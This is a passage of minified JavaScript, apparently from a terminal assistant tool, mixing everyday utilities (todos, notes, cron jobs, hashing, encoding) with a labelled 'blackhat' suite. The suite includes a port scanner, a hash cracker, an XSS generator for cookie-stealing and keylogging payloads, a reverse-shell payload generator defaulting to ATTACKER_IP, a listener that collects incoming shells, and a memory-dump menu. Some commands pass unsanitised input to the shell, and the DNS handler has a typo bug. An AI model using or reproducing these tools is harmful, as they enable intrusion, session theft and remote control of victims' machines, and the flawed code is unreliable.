    if(input==="/todo"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4CB} TODOS"+RST);if(!todos.length){console.log(p("dim","  All clear. /todo add task description\n"));return;}todos.forEach(function(t,i){var icon=t.done?p("green","\u2714"):p("yellow","\u25CB");console.log("  "+icon+" "+p("cyan","["+(i+1)+"]")+" "+t.text+(t.done?p("dim","  done"):""));});console.log("");return;}
    if(input.startsWith("/todo add ")){todos.push({text:input.substring(10).trim(),done:false,time:Date.now()});saveTodos();console.log(p("green","  \u2714 Added: "+todos[todos.length-1].text+"\n"));return;}
    if(input.startsWith("/todo done ")){var ti=parseInt(input.substring(11).trim())-1;if(isNaN(ti)||ti<0||ti>=todos.length){console.log(p("red","  Invalid index\n"));return;}todos[ti].done=true;saveTodos();console.log(p("green","  \u2714 Done: "+todos[ti].text+"\n"));return;}
    if(input.startsWith("/todo del ")){var td=parseInt(input.substring(10).trim())-1;if(isNaN(td)||td<0||td>=todos.length){console.log(p("red","  Invalid index\n"));return;}var dn=todos[td].text;todos.splice(td,1);saveTodos();console.log(p("green","  \u2714 Deleted: "+dn+"\n"));return;}
    if(input==="/todo clear"){todos=todos.filter(function(t){return !t.done;});saveTodos();console.log(p("green","  \u2714 Cleared done tasks.\n"));return;}
    if(input==="/notes"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4DD} NOTES"+RST);if(!notes.length){console.log(p("dim","  None yet. /notes add your note text\n"));return;}notes.slice(-20).forEach(function(n,i){console.log("  "+p("cyan","["+i+"]")+" "+p("dim",new Date(n.time).toISOString().substring(0,10))+" "+n.text.substring(0,80));});console.log("");return;}
    if(input.startsWith("/notes add ")){notes.push({text:input.substring(11).trim(),time:Date.now()});saveNotes();console.log(p("green","  \u2714 Saved.\n"));return;}
    if(input.startsWith("/notes search ")){var nq=input.substring(14).trim().toLowerCase();var nh=notes.filter(function(n){return n.text.toLowerCase().indexOf(nq)>=0;});console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F50D} NOTES: "+nq+RST);nh.slice(-15).forEach(function(n,i){console.log("  "+p("cyan","["+i+"]")+" "+n.text.substring(0,100));});console.log("");return;}
    if(input.startsWith("/notes del ")){var nd=parseInt(input.substring(11).trim());if(isNaN(nd)||nd<0||nd>=notes.length){console.log(p("red","  Invalid index\n"));return;}notes.splice(nd,1);saveNotes();console.log(p("green","  \u2714 Deleted.\n"));return;}
    if(input==="/cron"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F550} CRON JOBS"+RST);console.log(p("dim","  /cron add NAME 'every 5m' CMD"));console.log(p("dim","  /cron add NAME 'at 09:00' CMD"));console.log(p("dim","  /cron log / del ID / on|off ID\n"));if(!cronJobs.length){console.log(p("dim","  No jobs.\n"));return;}cronJobs.forEach(function(j,i){var icon=j.enabled===false?p("red","\u23F8"):p("green","\u25B6");var last=j.lastRun?timeAgo(j.lastRun):"never";console.log("  "+icon+" "+p("cyan","["+j.id+"]")+" "+j.name+p("dim","  "+j.schedule+"  last: "+last));});console.log("");return;}
    if(input.startsWith("/cron add ")){var cp=input.substring(10).trim();var m1=cp.match(/^(\S+)\s+'([^']+)'\s+(.+)$/)||cp.match(/^(\S+)\s+"([^"]+)"\s+(.+)$/);if(!m1){console.log(p("red","  Usage: /cron add NAME 'every 5m' CMD\n"));return;}var cj={id:Date.now().toString(36),name:m1[1],schedule:m1[2],cmd:m1[3],enabled:true,runs:0,created:Date.now(),parsed:parseCron(m1[2]),nextRun:null};if(!cj.parsed){console.log(p("red","  Bad schedule. Use 'every 5m' or 'at 09:00'\n"));return;}cronJobs.push(cj);saveCron();startCron();console.log(p("green","  \u2714 Job '"+cj.name+"' scheduled.\n"));return;}
    if(input.startsWith("/cron del ")){var cd=input.substring(10).trim();var ci=cronJobs.findIndex(function(j){return j.id===cd;});if(ci===-1){console.log(p("red","  Not found: "+cd+"\n"));return;}cronJobs.splice(ci,1);saveCron();console.log(p("green","  \u2714 Deleted.\n"));return;}
    if(input.startsWith("/cron on ")){var co=input.substring(9).trim();var cj2=cronJobs.find(function(j){return j.id===co;});if(!cj2){console.log(p("red","  Not found\n"));return;}cj2.enabled=true;saveCron();console.log(p("green","  Enabled.\n"));return;}
    if(input.startsWith("/cron off ")){var cf=input.substring(10).trim();var cj3=cronJobs.find(function(j){return j.id===cf;});if(!cj3){console.log(p("red","  Not found\n"));return;}cj3.enabled=false;saveCron();console.log(p("yellow","  Disabled.\n"));return;}
    if(input==="/cron log"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4C3} CRON LOG"+RST);cronJobs.forEach(function(j){var res=j.lastResult||"(no runs)";console.log("  "+p("cyan",j.name)+" "+p("dim","runs:"+j.runs+" last:"+(j.lastRun?timeAgo(j.lastRun):"never")+" result:"+res.substring(0,60)));});console.log("");return;}
    if(input==="/size"||input.startsWith("/size ")){var sd=input.length>5?resolve(input.substring(6).trim()):process.cwd();if(!existsSync(sd)){console.log(p("red","  Not found: "+sd+"\n"));return;}spin("calculating size","thinking");try{var sz=function du(d,dep){if(dep>6)return 0;var total=0;try{readdirSync(d).forEach(function(f){if(f==="node_modules"||f===".git")return;var p=join(d,f);try{var s2=statSync(p);if(s2.isDirectory())total+=du(p,dep+1);else total+=s2.size;}catch(e){}});}catch(e){}return total;};var bytes=sz(sd,0);unspin();var units=["B","KB","MB","GB"];var u=0,val=bytes;while(val>=1024&&u<units.length-1){val/=1024;u++;}console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F4E6} "+basename(sd)+RST+" "+p("cyan",val.toFixed(1)+units[u])+"\n");}catch(e){unspin();console.log(p("red","  "+e.message+"\n"));}return;}
    if(input==="/top"){if(process.platform==="win32"){console.log(TOOLS.exec("Get-Process | Sort-Object CPU -Descending | Select-Object -First 15 Name,Id,CPU,WorkingSet | Format-Table"));}else{console.log(TOOLS.exec("ps aux --sort=-%cpu | head -20"));}return;}
    if(input==="/net"){if(process.platform==="win32"){console.log(TOOLS.exec("Get-NetIPAddress | Select-Object IPAddress,InterfaceAlias | Format-Table"));}else{console.log(TOOLS.exec("ip addr show | grep 'inet\\b'"));}return;}
    if(input==="/hash"){console.log(p("yellow","\n  Usage: /hash md5|sha1|sha256|sha512 text\n"));return;}
    if(input.startsWith("/hash ")){var hp=input.substring(6).trim();var hs=hp.indexOf(" ");if(hs===-1){console.log(p("red","  Usage: /hash ALGO text\n"));return;}var halgo=hp.substring(0,hs).toLowerCase(),htext=hp.substring(hs+1);if(!["md5","sha1","sha256","sha512"].includes(halgo)){console.log(p("red","  Algo: md5 sha1 sha256 sha512\n"));return;}console.log(p("green","\n  "+halgo+": "+createHash(halgo).update(htext).digest("hex")+"\n"));return;}
    if(input==="/uuid"){console.log(p("green","\n  "+randomUUID()+"\n"));return;}
    if(input.startsWith("/which ")){var wc=input.substring(7).trim();var wcmd;if(process.platform==="win32")wcmd="where "+wc;else wcmd="which "+wc;var wres=TOOLS.exec(wcmd);console.log(p("cyan","\n  "+wc+": ")+wres+"\n");return;}
    if(input.startsWith("/port ")){var prt=input.substring(6).trim();var prcmd;if(process.platform==="win32")prcmd="netstat -an | findstr :"+prt;else prcmd="ss -tlnp | grep :"+prt;var pr=TOOLS.exec(prcmd);console.log(p("cyan","\n  Port "+prt+":\n")+pr+"\n");return;}
    if(input.startsWith("/json ")){var jp=input.substring(6).trim();if(!existsSync(resolve(jp))){console.log(p("red","  Not found\n"));return;}try{var jc=JSON.parse(readFileSync(resolve(jp),"utf8"));console.log("\n"+JSON.stringify(jc,null,2).substring(0,5000)+"\n");}catch(e){console.log(p("red","  Invalid JSON: "+e.message+"\n"));}return;}
    if(input==="/b64"){console.log(p("yellow","\n  Usage: /b64 enc text | /b64 dec base64string\n"));return;}
    if(input.startsWith("/b64 enc ")){console.log("\n  "+p("green",Buffer.from(input.substring(9).trim()).toString("base64"))+"\n");return;}
    if(input.startsWith("/b64 dec ")){try{console.log("\n  "+p("green",Buffer.from(input.substring(9).trim(),"base64").toString("utf8"))+"\n");}catch(e){console.log(p("red","  Invalid base64\n"));}return;}
    if(input.startsWith("/http ")){var hh2=input.substring(6).trim();var hsp=hh2.indexOf(" ");var hurl=hh2,hbody="";if(hsp>=0){hurl=hh2.substring(0,hsp);hbody=hh2.substring(hsp+1);}var hopt={method:hbody?"POST":"GET"};if(hbody){hopt.headers={"Content-Type":"application/json"};hopt.body=hbody;}try{spin("fetching","search");var hr=await fetch(hurl,hopt);var hd=await hr.text();unspin();console.log(p(hr.ok?"green":"red","\n  HTTP "+hr.status+" ("+hd.length+" chars)"));console.log(hd.substring(0,2000)+"\n");}catch(e){unspin();console.log(p("red","  "+e.message+"\n"));}return;}
    if(input==="/reload"){try{todos=JSON.parse(readFileSync(TODOS_F,"utf8"));}catch(e){todos=[];}try{notes=JSON.parse(readFileSync(NOTES_F,"utf8"));}catch(e){notes=[];}try{bookmarks=JSON.parse(readFileSync(BOOKMARKS_F,"utf8"));}catch(e){bookmarks={};}try{aliases=JSON.parse(readFileSync(ALIASES_F,"utf8"));}catch(e){aliases={};}try{cronJobs=JSON.parse(readFileSync(CRON_F,"utf8"));}catch(e){cronJobs=[];}try{customPersonas=JSON.parse(readFileSync(CUSTOM_PERSONAS_F,"utf8").trim().split("\n").filter(Boolean).map(function(l){try{return JSON.parse(l);}catch(f){return null;}}).filter(Boolean));allPersonas={};defaultPersonas.forEach(function(p){allPersonas[p.id]=p;});customPersonas.forEach(function(p){allPersonas[p.id]=p;});allPersonas=Object.values(allPersonas);}catch(e){}console.log(p("green","  \u2714 Reloaded state from disk.\n"));return;}
    // ═══ BLACKHAT / REDTEAM SUITE ═══
    if(input==="/scan"||input==="/scan help"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F50D} PORT SCANNER"+RST);console.log(p("dim","  /scan HOST START-END   e.g. /scan 127.0.0.1 1-1024"));console.log(p("dim","  /scan HOST 22,80,443     scan specific ports"));console.log(p("dim","  /scan log                 scan history\n"));return;}
    if(input.startsWith("/scan log")){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4C3} SCAN LOG"+RST);if(!scanLog.length){console.log(p("dim","  No scans yet.\n"));return;}scanLog.slice(0,15).forEach(function(s){console.log("  "+p("cyan",new Date(s.time).toLocaleTimeString())+" "+s.host+":"+p("yellow",s.ports.join(",")));});console.log("");return;}
    if(input.startsWith("/scan ")){var sc=input.substring(6).trim();if(sc.split(" ").length===2&&sc.split(" ")[1].indexOf("-")>=0){var shp=sc.split(" ");var host=shp[0];var rng=shp[1].split("-");var start=parseInt(rng[0]),end=parseInt(rng[1]);if(isNaN(start)||isNaN(end)||start<1||end>65535){console.log(p("red","  Ports 1-65535\n"));return;}console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F50D} Scanning "+host+":"+start+"-"+end+RST);var openPorts=[];var batch=0;for(var p=start;p<=end;p++){process.stdout.write("\r  "+p("dim","Checking: "+p+"/"+end));if(await scanPortSync(host,p)){openPorts.push(p);process.stdout.write("\r  "+p("green","OPEN: "+p)+"           \n");}batch++;if(batch%50===0)await sleep(50);}process.stdout.write("\r"+" ".repeat(40)+"\r");if(openPorts.length){console.log(p("green","\n  OPEN: "+openPorts.join(", ")));addScan({host:host,ports:openPorts,range:start+"-"+end});}else{console.log(p("dim","  No open ports found."));}console.log("");return;}
      if(sc.indexOf(" ")>=0&&sc.split(" ")[1].split(",").length>=1){var sh2=sc.split(" ");var host2=sh2[0];var ports=sh2[1].split(",").map(Number).filter(function(n){return !isNaN(n)&&n>0&&n<=65535;});if(!ports.length){console.log(p("red","  Invalid ports\n"));return;}console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F50D} Scanning "+host2+RST);var open2=[];for(var i=0;i<ports.length;i++){process.stdout.write("\r  "+p("dim","Checking: "+ports[i]));if(await scanPortSync(host2,ports[i])){open2.push(ports[i]);process.stdout.write("\r  "+p("green","OPEN: "+ports[i])+"           \n");}}process.stdout.write("\r"+" ".repeat(40)+"\r");console.log(open2.length?p("green","  OPEN: "+open2.join(", ")+"\n"):p("dim","  No open ports.\n"));if(open2.length)addScan({host:host2,ports:open2,range:ports.join(",")});return;}
      console.log(p("red","  Usage: /scan HOST port-range\n"));return;}
    if(input===("/whois")||input===("/whois help")){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F310} WHOIS"+RST);console.log(p("dim","  /whois DOMAIN     query domain registration info\n"));return;}
    if(input.startsWith("/whois ")){var dom=input.substring(7).trim();spin("whois "+dom,"search");try{var wres=whoisLookup(dom);unspin();console.log("\n"+wres.substring(0,3000)+"\n");}catch(e){unspin();console.log(p("red","  "+e.message+"\n"));}return;}
    if(input==="/dns"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4E1} DNS LOOKUP"+RST);console.log(p("dim","  /dns DOMAIN [A|MX|NS|TXT|CNAME|SOA|AAAA]\n"));return;}
    if(input.startsWith("/dns ")){var dq=input.substring(5).trim();var dsp=dq.lastIndexOf(" ");var ddom=dq,dtype="A";if(dsp>0){ddm=dq.substring(0,dsp);var dt=dq.substring(dsp+1).toUpperCase();if(["A","AAAA","MX","NS","TXT","CNAME","SOA"].includes(dt)){dtype=dt;}}spin("dns "+ddom+" "+dtype,"search");try{var dr=await dnsLookup(ddom,dtype);unspin();console.log("\n  "+rgb(255,215,0)+BOLD+ddom+" ("+dtype+")"+RST);dr.forEach(function(r){console.log("  "+p("cyan",r));});console.log("");}catch(e){unspin();console.log(p("red","  "+e.message+"\n"));}return;}
    if(input.startsWith("/ping ")){var ph=input.substring(6).trim().replace(/[^a-zA-Z0-9.-]/g,"");var pcmd;if(process.platform==="win32")pcmd="ping -n 4 "+ph;else pcmd="ping -c 4 "+ph;console.log(p("cyan","\n  \u{1F3D3} PING "+ph));console.log(TOOLS.exec(pcmd).substring(0,2000)+"\n");return;}
    if(input.startsWith("/traceroute ")){var th=input.substring(12).trim().replace(/[^a-zA-Z0-9.-]/g,"");var tcmd;if(process.platform==="win32")tcmd="tracert -h 20 "+th;else tcmd="traceroute -m 20 "+th;console.log(p("cyan","\n  \u{1F30D} TRACEROUTE "+th));console.log("\n"+TOOLS.exec(tcmd).substring(0,3000)+"\n");return;}
    if(input.startsWith("/ssl ")){var ssl=input.substring(5).trim().replace(/[^a-zA-Z0-9.-]/g,"");if(!ssl){console.log(p("red","  Usage: /ssl DOMAIN\n"));return;}spin("ssl "+ssl,"search");try{var sslres=TOOLS.exec("echo | openssl s_client -servername "+ssl+" -connect "+ssl+":443 2>/dev/null | openssl x509 -noout -dates -subject -issuer -fingerprint 2>/dev/null");unspin();console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F510} SSL: "+ssl+RST);console.log(sslres.substring(0,3000)+"\n");}catch(e){unspin();console.log(p("red","  "+e.message+"\n"));}return;}
    if(input.startsWith("/headers ")){var hu=input.substring(9).trim();if(!hu){console.log(p("red","  Usage: /headers URL\n"));return;}if(!hu.startsWith("http"))hu="https://"+hu;spin("headers "+hu,"search");try{var hr2=await fetch(hu,{method:"HEAD",redirect:"follow"});var hdrs={};hr2.headers.forEach(function(v,k){hdrs[k]=v;});unspin();console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F4E8} HEADERS: "+hu+RST+"  "+p("dim","("+hr2.status+")"));Object.keys(hdrs).sort().forEach(function(k){console.log("  "+p("cyan",k+": ")+hdrs[k]);});console.log("");}catch(e){unspin();console.log(p("red","  "+e.message+"\n"));}return;}
    if(input.startsWith("/ip ")){var iq=input.substring(4).trim();if(!iq){var ipcmd;if(process.platform==="win32")ipcmd="curl -s ipinfo.io";else ipcmd="curl -s ipinfo.io";console.log("\n"+TOOLS.exec(ipcmd).substring(0,2000)+"\n");return;}var iq2=iq.replace(/[^a-zA-Z0-9.:]/g,"");spin("ip "+iq2,"search");try{var ir=await fetch("https://ipapi.co/"+iq2+"/json/");var id=await ir.json();unspin();console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F30D} IP: "+iq2+RST);console.log("  "+p("cyan","IP: ")+(id.ip||"")+p("dim","  City: "+(id.city||"")+"  Region: "+(id.region||"")+"  Country: "+(id.country_name||"")));console.log("  "+p("cyan","ISP: ")+(id.org||"")+p("dim","  ASN: "+(id.asn||"")));if(id.timezone)console.log("  "+p("cyan","TZ: ")+id.timezone+p("dim","  Lat/Lng: "+(id.latitude||"")+", "+(id.longitude||"")));console.log("");}catch(e){unspin();console.log(p("red","  "+e.message+"\n"));}return;}
    if(input==="/ip"){var ipc=process.platform==="win32"?"curl -s ipinfo.io":"curl -s ipinfo.io";console.log("\n"+TOOLS.exec(ipc).substring(0,2000)+"\n");return;}
    if(input.startsWith("/banner ")){var bh=input.substring(8).trim();var bsp=bh.lastIndexOf(":");if(bsp<0){console.log(p("red","  Usage: /banner HOST:PORT\n"));return;}var bhost=bh.substring(0,bsp),bport=parseInt(bh.substring(bsp+1));if(isNaN(bport)||bport<1||bport>65535){console.log(p("red","  Invalid port\n"));return;}spin("banner "+bh,"search");try{var bres=await new Promise(function(ok){var socks=createConnection({host:bhost,port:bport,timeout:5000},function(){var d="";socks.write("HEAD / HTTP/1.0\r\n\r\n");var tmr=setTimeout(function(){try{socks.destroy();}catch(e){}ok(d||"connected (no banner)");},1200);socks.on("data",function(chunk){d+=chunk.toString();if(d.length>2000){clearTimeout(tmr);try{socks.destroy();}catch(e){}ok(d);}});socks.on("end",function(){clearTimeout(tmr);try{socks.destroy();}catch(e){}ok(d);});socks.on("close",function(){clearTimeout(tmr);ok(d);});});socks.on("error",function(e){try{socks.destroy();}catch(e2){}ok("ERR: "+e.message);});});unspin();console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F4E1} BANNER: "+bhost+":"+bport+RST);console.log(bres.substring(0,2000)+"\n");}catch(e){unspin();console.log(p("red","  "+e.message+"\n"));}return;}
    if(input==="/encode"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F504} ENCODE/DECODE"+RST);console.log(p("dim","  /encode rot13 TEXT         ROT13"));console.log(p("dim","  /encode hex TEXT            hex encode"));console.log(p("dim","  /encode unhex HEX           hex decode"));console.log(p("dim","  /encode url TEXT            URL encode"));console.log(p("dim","  /encode unurl ENCODED       URL decode"));console.log(p("dim","  /encode morse TEXT          to morse"));console.log(p("dim","  /encode unmorse ...- ---    from morse\n"));return;}
    if(input.startsWith("/encode rot13 ")){console.log("\n  "+p("green",rot13(input.substring(14).trim()))+"\n");return;}
    if(input.startsWith("/encode hex ")){console.log("\n  "+p("green",Buffer.from(input.substring(12).trim()).toString("hex"))+"\n");return;}
    if(input.startsWith("/encode unhex ")){try{console.log("\n  "+p("green",Buffer.from(input.substring(14).trim(),"hex").toString("utf8"))+"\n");}catch(e){console.log(p("red","  Invalid hex\n"));}return;}
    if(input.startsWith("/encode url ")){console.log("\n  "+p("green",encodeURIComponent(input.substring(12).trim()))+"\n");return;}
    if(input.startsWith("/encode unurl ")){try{console.log("\n  "+p("green",decodeURIComponent(input.substring(14).trim()))+"\n");}catch(e){console.log(p("red","  Invalid URL encoding\n"));}return;}
    if(input.startsWith("/encode morse ")){console.log("\n  "+p("green",strToMorse(input.substring(14).trim()))+"\n");return;}
    if(input.startsWith("/encode unmorse ")){console.log("\n  "+p("green",morseToStr(input.substring(16).trim()))+"\n");return;}
    if(input==="/genpass"){var glen=20;var gc="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?";var gp="";for(var gi=0;gi<glen;gi++)gp+=gc[Math.floor(Math.random()*gc.length)];console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F511} PASSWORD"+RST);console.log("  "+p("green",gp)+"\n");return;}
    if(input.startsWith("/genpass ")){var gl=parseInt(input.substring(9).trim());if(isNaN(gl)||gl<4||gl>128)gl=20;var gc2="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?";var gp2="";for(var gi2=0;gi2<gl;gi2++)gp2+=gc2[Math.floor(Math.random()*gc2.length)];console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F511} PASSWORD ("+gl+" chars)"+RST);console.log("  "+p("green",gp2)+"\n");return;}
    // ═══ BRUTE / HYDRA-STYLE HASH CRACKER ═══
    if(input==="/brute"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F5DD} BRUTE HASH CRACKER (Hydra-style)"+RST);console.log(p("dim","  /brute wordlist WORD [ALGO]    generate wordlist mutations"));console.log(p("dim","  /brute add WORD [ALGO] [SEED]  add job to crack queue"));console.log(p("dim","  /brute crack HASH [WORD] [ALGO] try to crack a single hash"));console.log(p("dim","  /brute jobs                   list active cracking jobs"));console.log(p("dim","  /brute del ID                  stop job"));console.log(p("dim","  /brute dict WORD               common passwords"));console.log(p("dim","  Algos: md5 sha1 sha256 sha512\n"));return;}
    if(input.startsWith("/brute wordlist ")){var bw=input.substring(16).trim();var ba="sha256";if(bw.indexOf(" ")>=0){var bps=bw.split(" ");bw=bps[0];ba=bps[1]||"sha256";}var wl=wordlistGen(bw);console.log("\n  "+rgb(255,215,0)+BOLD+"WORDLIST: "+bw+" ("+ba+")"+RST);wl.forEach(function(w,i){console.log("  "+p("cyan","["+i+"]")+" "+w+p("dim","  "+hashGen(ba,w).substring(0,16)+"..."));});console.log(p("dim","\n  "+wl.length+" variants generated. /brute crack HASH to try.\n"));return;}
    if(input.startsWith("/brute dict ")){var bd=input.substring(12).trim();var dict=[bd,bd+"123",bd+"1234",bd+"12345",bd+"1",bd+"12",bd+"!",bd+"@",bd+"#",bd+"2024",bd+"2025",bd+"2026",bd.toUpperCase(),bd.toLowerCase(),bd+bd,bd+"password","password","123456","12345678","qwerty","admin","letmein","welcome","monkey",bd+"admin"];console.log("\n  "+rgb(255,215,0)+BOLD+"DICTIONARY: "+bd+RST);var uniq=[];var seen2={};dict.forEach(function(w){if(!seen2[w]){seen2[w]=true;uniq.push(w);}});uniq.forEach(function(w,i){console.log("  "+p("cyan","["+i+"]")+" "+w);});console.log(p("dim","\n  "+uniq.length+" entries. /brute crack HASH WORD to try.\n"));return;}
    if(input.startsWith("/brute crack ")){var bc=input.substring(13).trim();var bparts=bc.split(" ");var bhash2=bparts[0];var bword2=bparts[1]||"password";var balgo2=bparts[2]||"sha256";if(!bhash2||bhash2.length<8){console.log(p("red","  Invalid hash\n"));return;}spin("bruteforcing "+balgo2,"thinking");try{var wlist=wordlistGen(bword2);var found=false;for(var wi=0;wi<wlist.length;wi++){var h=hashGen(balgo2,wlist[wi]);if(h===bhash2){unspin();console.log("\n  "+p("green","\u{1F4A5} CRACKED!")+p("yellow","  "+bhash2.substring(0,16)+"...")+p("green"," -> "+wlist[wi])+"\n");found=true;break;}}if(!found){unspin();console.log(p("yellow","\n  Not cracked in this wordlist. Try /brute wordlist WORD for more.\n"));}}catch(e){unspin();console.log(p("red","  "+e.message+"\n"));}return;}
    if(input.startsWith("/brute add ")){var bj=input.substring(11).trim();var bjp=bj.split(" ");var bname=bjp[0];var balgo=bjp[1]||"sha256";var bseed=bjp[2]||bname;var job={id:Date.now().toString(36),name:bname,algo:balgo,seed:bseed,status:"queued",created:Date.now(),results:0};bruteSessions.push(job);saveBrute();console.log(p("green","  \u2714 Job '"+bname+"' queued ("+balgo+"). /brute jobs to view.\n"));return;}
    if(input==="/brute jobs"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F5DD} BRUTE JOBS"+RST);if(!bruteSessions.length){console.log(p("dim","  No jobs. /brute add WORD to start.\n"));return;}bruteSessions.forEach(function(j,i){var s=j.status==="done"?p("green","\u2714"):j.status==="running"?p("yellow","\u23F3"):p("dim","\u23F8");console.log("  "+s+" "+p("cyan","["+j.id+"]")+" "+j.name+"  "+p("dim",j.algo+" seed:"+j.seed+" results:"+(j.results||0)));});console.log("");return;}
    if(input.startsWith("/brute del ")){var bdel=input.substring(11).trim();var bidx=bruteSessions.findIndex(function(j){return j.id===bdel;});if(bidx===-1){console.log(p("red","  Not found\n"));return;}bruteSessions.splice(bidx,1);saveBrute();console.log(p("green","  \u2714 Deleted.\n"));return;}
    // ═══ XSS HOOK / BeEF-STYLE ═══
    if(input==="/hook"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1FA84} XSS HOOK FACTORY (BeEF-style)"+RST);console.log(p("dim","  /hook list                    all payloads"));console.log(p("dim","  /hook gen TYPE [SERVER]       generate payload"));console.log(p("dim","  /hook gen steal YOURSERVER    cookie stealer"));console.log(p("dim","  /hook gen keylog YOURSERVER   keylogger"));console.log(p("dim","  /hook raw PAYLOAD             test custom payload\n"));return;}
    if(input==="/hook list"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1FA84} XSS PAYLOADS"+RST);var hk=Object.keys(XSS_PAYLOADS);hk.forEach(function(k){var preview=XSS_PAYLOADS[k].substring(0,75).replace(/\n/g,"");console.log("  "+p("cyan",k.padEnd(12))+" "+p("dim",preview));});console.log("");return;}
    if(input.startsWith("/hook gen ")){var hg=input.substring(10).trim();var hsp2=hg.indexOf(" ");var htype="basic",hserver="YOURSERVER";if(hsp2>=0){htype=hg.substring(0,hsp2);hserver=hg.substring(hsp2+1).trim()||"YOURSERVER";}else{htype=hg;}var payload=XSS_PAYLOADS[htype];if(!payload){console.log(p("red","  Unknown type: "+htype+". /hook list for options.\n"));return;}payload=payload.replace(/YOURSERVER/g,hserver);console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1FA84} PAYLOAD ["+htype+"]"+RST);console.log(p("green","  "+payload)+"\n");return;}
    if(input.startsWith("/hook raw ")){var hr2=input.substring(10).trim();console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1FA84} RAW PAYLOAD"+RST);console.log(p("green","  "+hr2)+"\n");console.log(p("dim","  Encoded: ")+encodeURIComponent(hr2).substring(0,200)+"\n");return;}
    // ═══ REVERSE SHELL / SLAVER ═══
    if(input==="/slave"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4E1} REVERSE SHELL SLAVER"+RST);console.log(p("dim","  /slave listen PORT             start listener"));console.log(p("dim","  /slave stop                    stop listener"));console.log(p("dim","  /slave gen TYPE HOST PORT      generate payload"));console.log(p("dim","  /slave types                   list all payload types"));console.log(p("dim","  /slave sessions                active sessions\n"));return;}
    if(input==="/slave types"){var stypes=["bash","nc","nc2","python","php","ruby","perl","powershell","node"];console.log("\n"+rgb(255,215,0)+BOLD+"  PAYLOAD TYPES"+RST);stypes.forEach(function(t){console.log("  "+p("cyan","  /slave gen "+t+" HOST PORT"));});console.log("");return;}
    if(input.startsWith("/slave gen ")){var sg=input.substring(11).trim().split(" ");var stype=sg[0],shost=sg[1]||"ATTACKER_IP",sport=sg[2]||"4444";var spayload=genShellPayload(stype,shost,sport);if(spayload.indexOf("dev/tcp")>=0&&stype!=="bash"){console.log(p("red","  Unknown type: "+stype+". /slave types\n"));return;}console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F4E1} SHELL ["+stype+"] "+shost+":"+sport+RST);console.log(p("green","  "+spayload)+"\n");return;}
    if(input.startsWith("/slave listen ")){var slport=parseInt(input.substring(14).trim());if(isNaN(slport)||slport<1||slport>65535){console.log(p("red","  Invalid port\n"));return;}if(SLISTEN){console.log(p("yellow","  Already listening on "+sServer.address().port+"\n"));return;}try{sServer=createServer(function(c){var sid=Date.now().toString(36);var sess={id:sid,remote:c.remoteAddress+":"+c.remotePort,time:Date.now(),active:true};sShells.push(sess);shells.push(sess);saveShells();console.log("\n  "+p("green","\u{1F4E1} SHELL: "+sess.remote)+" "+p("dim","["+sid+"]"));c.on("data",function(d){var out=d.toString().trim();console.log(p("cyan","  ["+sid+"] ")+out);});c.on("end",function(){sess.active=false;console.log(p("yellow","  ["+sid+"] disconnected"));});c.on("error",function(){});c.write("\u{1F4E1} BRO shell active\n");});sServer.listen(slport,"0.0.0.0",function(){SLISTEN=true;console.log(p("green","\n  \u{1F442} Listening on 0.0.0.0:"+slport+" (CTRL+C or /slave stop)"));console.log(p("dim","  Send this to target: /slave gen bash YOUR_IP "+slport+"\n"));});}catch(e){console.log(p("red","  "+e.message+"\n"));}return;}
    if(input==="/slave stop"){stopShellListener();sShells=[];console.log(p("yellow","  \u2714 Listener stopped.\n"));return;}
    if(input==="/slave sessions"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4E1} SHELL SESSIONS"+RST);if(!sShells.length&&!shells.length){console.log(p("dim","  No sessions.\n"));return;}(sShells.length?sShells:shells).forEach(function(s){var icon=s.active?p("green","\u25CF"):p("dim","\u25CB");console.log("  "+icon+" "+p("cyan","["+s.id+"]")+" "+s.remote+" "+p("dim",timeAgo(s.time)));});console.log("");return;}
    // ═══ MEMDUMP / MEMORY FLASHER ═══
    if(input==="/memdump"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F9E0} MEMORY DUMP / FLASHER"+RST);console.log(p("dim","  /memdump strings PID           dump strings from process"));console.log(p("dim","  /memdump proc                  list running processes"));console.log(p("dim","  /memdump env PID               dump env of a process"));console.log(p("dim","  /memdump heap                  show BRO heap stats\n"));return;}
